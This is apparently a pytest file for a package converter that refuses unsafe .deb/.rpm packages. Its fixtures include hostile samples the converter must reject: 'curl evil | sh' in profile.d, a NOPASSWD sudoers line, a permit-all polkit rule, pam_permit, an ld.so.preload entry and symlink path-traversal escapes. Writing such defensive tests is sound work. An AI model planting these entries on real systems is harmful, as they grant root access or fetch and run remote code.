"""Converting a .deb/.rpm the analysis found safe into a pacman package."""

import subprocess

import pytest

import builders
from cygnus.core.backends import foreign
from cygnus.core.detect import detect_file
from cygnus.core.errors import CygnusError
from cygnus.core.ops import convert

pytestmark = pytest.mark.needs_tool("makepkg", "fakeroot", "bsdtar", "zstd")

FILES = {"usr/bin/hello": b"#!/bin/sh\necho hello\n", "lib/hello/data.txt": b"data\n",
         "etc/cron.d/hello": b"* * * * * root true\n", "usr/share/doc/hello/README": b"readme\n"}


def _verdict(cand):
    return foreign.analyse(cand, satisfy=lambda deps: {}, sonames_on_host=set(), glibc_on_host=(2, 40))


def _contents(pkg):
    return subprocess.run(["bsdtar", "-tf", str(pkg)], capture_output=True, text=True, check=True).stdout.split()


def _pkginfo(pkg):
    text = subprocess.run(["bsdtar", "-xOf", str(pkg), ".PKGINFO"], capture_output=True, text=True).stdout
    return dict(line.split(" = ", 1) for line in text.splitlines() if " = " in line)


def test_deb_becomes_a_pacman_package(tmp_path):
    cand = detect_file(builders.build_deb(tmp_path, depends="", files=FILES))
    verdict = _verdict(cand)
    assert verdict.strategy == "convert", verdict.summary
    pkg, notes = convert.convert(cand, verdict, tmp_path / "out")
    files = _contents(pkg)
    assert "usr/bin/hello" in files and "usr/lib/hello/data.txt" in files
    assert not any(f.startswith(("lib/", "etc/cron.d")) for f in files)
    assert "/lib moved to /usr/lib" in notes and "/etc/cron.d left out" in notes
    info = _pkginfo(pkg)
    assert info["pkgname"] == "hello" and info["pkgver"] == f"1.2.3-{convert.CONVERSION_REVISION}" and "converted from" in info["pkgdesc"]


def test_rpm_becomes_a_pacman_package(tmp_path):
    cand = detect_file(builders.build_rpm(tmp_path, requires=("/bin/sh",), postin=None,
                                          files={"usr/bin/hello": b"#!/bin/sh\n", "usr/sbin/helloctl": b"#!/bin/sh\n"}))
    verdict = _verdict(cand)
    assert verdict.strategy == "convert", verdict.summary
    pkg, notes = convert.convert(cand, verdict, tmp_path / "out")
    assert {"usr/bin/hello", "usr/bin/helloctl"} <= set(_contents(pkg))
    assert "/usr/sbin moved to /usr/bin" in notes


def test_only_packages_marked_convertible_are_converted(tmp_path):
    cand = detect_file(builders.build_deb(tmp_path, depends="", files=FILES))
    verdict = _verdict(cand)
    verdict.strategy = "refuse"
    with pytest.raises(CygnusError, match="found safe to convert"):
        convert.convert(cand, verdict, tmp_path / "out")


def test_files_outside_usr_etc_opt_are_refused(tmp_path):
    cand = detect_file(builders.build_deb(tmp_path, depends="", files={"srv/hello/x": b"x"}))
    verdict = _verdict(cand)
    # the analysis already says so (it used to say "convert" and let convert() fail later)...
    assert verdict.strategy == "refuse" and any(i.code == "FOREIGN_UNSUPPORTED_ROOT" for i in verdict.issues)
    # ...and convert() still refuses on its own, whatever it is told
    verdict.strategy = "convert"
    with pytest.raises(CygnusError, match="installs into /srv"):
        convert.convert(cand, verdict, tmp_path / "out")


def test_version_and_name_mapping():
    assert convert.pacman_version("2:1.0-3ubuntu1") == ("2", "1.0")
    assert convert.pacman_version("1.2.3") == (None, "1.2.3")
    assert convert.pacman_version("1.0~rc1-1") == (None, "1.0_rc1")
    assert convert.pacman_name("Foo Bar") == "foo-bar"


def _tar_with_links(entries):
    """A data.tar with symlinks (tarfile, so the links are stored as links)."""
    import io
    import tarfile

    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tar:
        for name, kind, value in entries:
            info = tarfile.TarInfo(name)
            if kind == "link":
                info.type, info.linkname = tarfile.SYMTYPE, value
                tar.addfile(info)
            elif kind == "dir":
                info.type = tarfile.DIRTYPE
                tar.addfile(info)
            else:
                info.size = len(value)
                tar.addfile(info, io.BytesIO(value))
    return buf.getvalue()


@pytest.mark.parametrize("entries", [
    # usr/lib is a link out of the package; lib/ content would be merged through it
    [("./usr", "dir", None), ("./usr/lib", "link", "../../../../../../../../tmp/cygnus-escape"),
     ("./lib/autostart/evil.desktop", "file", b"[Desktop Entry]\n")],
    # etc is a link; dropping etc/default would delete through it
    [("./etc", "link", "../../../../../../../../tmp/cygnus-escape"), ("./usr/bin/x", "file", b"#!/bin/sh\n")],
    # a link deeper in the merge target
    [("./usr/lib/autostart", "link", "../../../../../../../../tmp/cygnus-escape"),
     ("./lib/autostart/evil.desktop", "file", b"x")],
])
def test_links_in_the_package_are_never_followed(tmp_path, entries):
    import shutil
    from pathlib import Path

    escape = Path("/tmp/cygnus-escape")
    shutil.rmtree(escape, ignore_errors=True)
    escape.mkdir()
    (escape / "default").mkdir()
    (escape / "default" / "keep").write_text("must survive")
    try:
        deb = builders.build_deb(tmp_path, depends="")
        # swap in a payload with links
        import builders as b

        data = _tar_with_links(entries)
        control = b._tar_bytes({"./control": b"Package: hello\nVersion: 1.0\nArchitecture: amd64\n"
                                             b"Maintainer: t\nDescription: t\n"}, "w:xz")
        deb.write_bytes(b._ar([("debian-binary", b"2.0\n"), ("control.tar.xz", control), ("data.tar.gz", data)]))
        cand = detect_file(deb)
        with pytest.raises(CygnusError, match="link"):
            convert.convert(cand, _verdict(cand), tmp_path / "out")
        assert sorted(p.name for p in escape.iterdir()) == ["default"]  # nothing planted
        assert (escape / "default" / "keep").read_text() == "must survive"  # nothing deleted
    finally:
        shutil.rmtree(escape, ignore_errors=True)


def test_files_only_in_legacy_folders_are_merged_and_stay_executable(tmp_path):
    cand = detect_file(builders.build_rpm(tmp_path, requires=("/bin/sh",), postin=None,
                                          files={"usr/sbin/onlyhere": b"#!/bin/sh\n"}))
    pkg, notes = convert.convert(cand, _verdict(cand), tmp_path / "out")
    listing = subprocess.run(["bsdtar", "-tvf", str(pkg)], capture_output=True, text=True).stdout
    line = next(l for l in listing.splitlines() if l.endswith("usr/bin/onlyhere"))
    assert line.startswith("-rwxr-xr-x"), line
    deb = detect_file(builders.build_deb(tmp_path, depends="", files={"usr/bin/tool": b"#!/bin/sh\n"}))
    pkg, _ = convert.convert(deb, _verdict(deb), tmp_path / "out2")
    listing = subprocess.run(["bsdtar", "-tvf", str(pkg)], capture_output=True, text=True).stdout
    assert next(l for l in listing.splitlines() if l.endswith("usr/bin/tool")).startswith("-rwxr-xr-x")


def test_a_payload_bomb_is_refused_before_extraction(tmp_path, monkeypatch):
    """A tiny .deb that declares 1 KiB but expands to 64 MiB."""
    from cygnus.core.backends import foreign

    deb = builders.build_deb(tmp_path, depends="", files={"usr/share/zeros": b"\0" * (64 << 20)})
    assert deb.stat().st_size < 1 << 20
    monkeypatch.setattr(foreign, "MAX_EXTRACT_BYTES", 16 << 20)
    cand = detect_file(deb)
    out = tmp_path / "extract"
    out.mkdir()
    with pytest.raises(ValueError, match="too large to inspect"):
        foreign.extract_payload(cand, out)
    assert list(out.iterdir()) == []


# -- review round 4: files that run as administrator after install are never carried over -------------------
def _analyse_files(tmp_path, files):
    return _verdict(detect_file(builders.build_deb(tmp_path, depends="", files={"usr/bin/hello": b"#!/bin/sh\n", **files})))


@pytest.mark.parametrize("path, content", [
    ("usr/share/libalpm/hooks/x.hook", b"[Trigger]\n[Action]\nExec=/usr/bin/true\n"),
    ("etc/pacman.d/hooks/x.hook", b"x"),
    ("etc/ld.so.preload", b"/usr/lib/evil.so\n"),
    ("etc/sudoers.d/x", b"u ALL=(ALL) NOPASSWD: ALL\n"),
    ("etc/polkit-1/rules.d/50-x.rules", b"polkit.addRule(function(){return polkit.Result.YES;});\n"),
    ("usr/share/polkit-1/rules.d/50-x.rules", b"x"),
    ("etc/pam.d/sudo", b"auth sufficient pam_permit.so\n"),
    ("usr/lib/security/pam_evil.so", b"x"),
    ("etc/profile.d/x.sh", b"curl evil | sh\n"),
    ("etc/environment", b"LD_LIBRARY_PATH=/x\n"),
    ("etc/ssl/certs/evil-ca.pem", b"x"),
    ("etc/crontab", b"* * * * * root x\n"),
    ("lib/udev/rules.d/90-x.rules", b'ACTION=="add", RUN+="/usr/bin/x"\n'),
    ("usr/lib/udev/rules.d/90-x.rules", b'SUBSYSTEM=="usb", PROGRAM="/usr/bin/x", SYMLINK+="x"\n'),
    ("etc/modprobe.d/x.conf", b"install foo /usr/bin/x\n"),
    ("usr/lib/systemd/system-generators/x", b"x"),
    ("lib/systemd/system/foo.service.d/override.conf", b"[Service]\nExecStart=/x\n"),  # for a unit it doesn't ship
    ("usr/lib/initcpio/hooks/x", b"x"),
    ("etc/NetworkManager/dispatcher.d/x", b"x"),
    ("etc/grub.d/40_custom", b"#!/bin/sh\nexec tail -n +3 $0\n"),
])
def test_files_that_run_as_administrator_stop_the_conversion(tmp_path, path, content):
    verdict = _analyse_files(tmp_path, {path: content})
    assert verdict.strategy == "refuse", (path, verdict.summary)
    [issue] = [i for i in verdict.issues if i.code == "FOREIGN_ROOT_HOOKS"]
    assert path.split("/")[-1] in issue.explanation or path.replace("lib/", "usr/lib/", 1) in issue.explanation


def test_a_link_that_enables_a_unit_at_boot_stops_the_conversion(tmp_path):
    import io
    import tarfile

    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tar:
        for name, data in (("./usr/bin/hello", b"#!/bin/sh\n"), ("./lib/systemd/system/x.service", b"[Unit]\n")):
            info = tarfile.TarInfo(name)
            info.size = len(data)
            info.mode = 0o755
            tar.addfile(info, io.BytesIO(data))
        link = tarfile.TarInfo("./lib/systemd/system/multi-user.target.wants/x.service")
        link.type, link.linkname = tarfile.SYMTYPE, "../x.service"
        tar.addfile(link)
    path = builders.build_deb(tmp_path, depends="", files={"usr/bin/hello": b"x"})
    # replace the data member of a normal deb by the tarball with the link
    raw = path.read_bytes()
    deb = builders._ar([("debian-binary", b"2.0\n"),
                        ("control.tar.xz", builders._tar_bytes({"./control": b"Package: hello\nVersion: 1\n"
                                                                b"Architecture: amd64\nMaintainer: T <t@x.invalid>\n"
                                                                b"Installed-Size: 1\nDepends: \nDescription: t\n"},
                                                               "w:xz")),
                        ("data.tar.gz", buf.getvalue())])
    path.write_bytes(deb)
    verdict = _verdict(detect_file(path))
    assert verdict.strategy == "refuse"
    assert any("multi-user.target.wants" in i.explanation for i in verdict.issues if i.code == "FOREIGN_ROOT_HOOKS")


def test_a_drop_in_for_the_packages_own_service_and_plain_rules_are_only_reviewed(tmp_path):
    verdict = _analyse_files(tmp_path, {
        "lib/systemd/system/hello.service": b"[Unit]\n",
        "lib/systemd/system/hello.service.d/10-extra.conf": b"[Service]\nNice=5\n",
        "usr/lib/udev/rules.d/70-hello.rules": b'SUBSYSTEM=="hidraw", TAG+="uaccess"\n',
        "etc/modprobe.d/hello.conf": b"options hello debug=1\n"})
    assert not any(i.code == "FOREIGN_ROOT_HOOKS" for i in verdict.issues)
    review = " ".join(verdict.scripts.review)
    assert "hello.service.d/10-extra.conf" in review and "70-hello.rules" in review and "hello.conf" in review


def test_convert_checks_the_final_tree_whatever_the_analysis_said(tmp_path):
    cand = detect_file(builders.build_deb(tmp_path, depends="", files={"usr/bin/hello": b"#!/bin/sh\n",
                                                                       "etc/sudoers.d/x": b"u ALL=(ALL) ALL\n"}))
    verdict = _verdict(cand)
    verdict.strategy = "convert"  # a stale or tampered verdict
    with pytest.raises(CygnusError, match="run with administrator rights"):
        convert.convert(cand, verdict, tmp_path / "out")
    assert not list((tmp_path / "out").glob("*.pkg.tar.*")) if (tmp_path / "out").exists() else True


def test_the_ordinary_package_still_converts(tmp_path):
    verdict = _analyse_files(tmp_path, {"usr/share/applications/hello.desktop": b"[Desktop Entry]\n",
                                        "usr/lib/udev/rules.d/70-hello.rules": b'TAG+="uaccess"\n'})
    assert verdict.strategy == "convert", verdict.summary


# -- review round 4, second look: what pacman's own hooks apply as administrator --------------------------
@pytest.mark.parametrize("path", [
    "etc/systemd/system/sshd.service.d/override.conf",      # changes another package's service
    "etc/systemd/system/systemd-journald.service",            # shadows a unit every systemd computer has
    "etc/systemd/user/foo.service.d/override.conf",
    "etc/systemd/logind.conf", "etc/systemd/journald.conf.d/x.conf",
    "usr/lib/sysusers.d/hello.conf", "usr/lib/tmpfiles.d/hello.conf", "usr/lib/binfmt.d/hello.conf",
    "usr/lib/sysctl.d/90-hello.conf", "etc/sysctl.d/90-hello.conf", "etc/sysctl.conf",
    "usr/lib/modules-load.d/hello.conf", "etc/modules-load.d/hello.conf",
    "usr/lib/gio/modules/libgiohello.so", "usr/lib/gdk-pixbuf-2.0/2.10.0/loaders/libpixbufloader-hello.so",
    "usr/lib/gtk-3.0/3.0.0/immodules/im-hello.so", "usr/lib/vlc/plugins/hello/libhello_plugin.so",
])
def test_files_that_pacman_hooks_apply_or_load_as_administrator_stop_the_conversion(tmp_path, path):
    verdict = _analyse_files(tmp_path, {path: b"x"})
    assert verdict.strategy == "refuse", (path, verdict.summary)
    assert any(i.code == "FOREIGN_ROOT_HOOKS" for i in verdict.issues)


def test_the_reason_says_what_actually_happens(tmp_path):
    verdict = _analyse_files(tmp_path, {"usr/lib/tmpfiles.d/hello.conf": b"x"})
    [issue] = [i for i in verdict.issues if i.code == "FOREIGN_ROOT_HOOKS"]
    assert "applied as administrator by a pacman hook when the package is installed" in issue.explanation


def test_units_and_rules_under_usr_lib_are_still_only_reviewed(tmp_path):
    verdict = _analyse_files(tmp_path, {"lib/systemd/system/hello.service": b"[Unit]\n",
                                        "usr/lib/udev/hwdb.d/70-hello.hwdb": b"x"})
    assert not any(i.code == "FOREIGN_ROOT_HOOKS" for i in verdict.issues)
    assert verdict.strategy in ("convert", "review", "portable")


def test_a_vendors_own_service_in_etc_systemd_is_reviewed_not_refused(tmp_path):
    """The real WhatPulse deb ships /etc/systemd/system/whatpulse-pcap-service.service: its own unit."""
    verdict = _analyse_files(tmp_path, {
        "etc/systemd/system/hello-daemon.service": b"[Unit]\n",
        "etc/systemd/system/hello-daemon.service.d/10-extra.conf": b"[Service]\nNice=5\n"})
    assert not any(i.code == "FOREIGN_ROOT_HOOKS" for i in verdict.issues), verdict.issues
    review = " ".join(verdict.scripts.review)
    assert "hello-daemon.service" in review and "10-extra.conf" in review


def test_a_package_shipping_the_base_unit_in_usr_lib_may_override_it_in_etc(tmp_path):
    verdict = _analyse_files(tmp_path, {
        "lib/systemd/system/hello-daemon.service": b"[Unit]\n",
        "etc/systemd/system/hello-daemon.service.d/override.conf": b"[Service]\nNice=5\n"})
    assert not any(i.code == "FOREIGN_ROOT_HOOKS" for i in verdict.issues)
